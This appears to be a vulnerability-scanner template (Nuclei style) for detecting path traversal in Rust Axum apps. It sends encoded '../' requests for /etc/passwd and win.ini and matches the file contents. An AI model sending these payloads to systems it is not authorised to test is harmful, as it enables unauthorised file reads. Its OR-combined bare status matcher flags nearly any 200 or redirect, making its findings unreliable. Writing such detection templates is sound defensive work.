id: rust-axum-path-injection
info:
  name: Axum Path Injection
  author: Guardian
  severity: high
  description: Detects path traversal vulnerabilities in Axum applications
  tags: rust,axum,path-traversal,lfi

requests:
  - raw:
      - |
        GET /files/../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /static/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /api/users/%2e%2e/%2e%2e/admin HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /download/..%5c..%5c..%5cwindows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:"
          - "[extensions]"
          - "uid="
        part: body
        condition: or

      - type: regex
        regex:
          - "(root:x:0:0|\\[extensions\\]|uid=)"
        part: body

      - type: status
        status:
          - 200
          - 301
          - 302
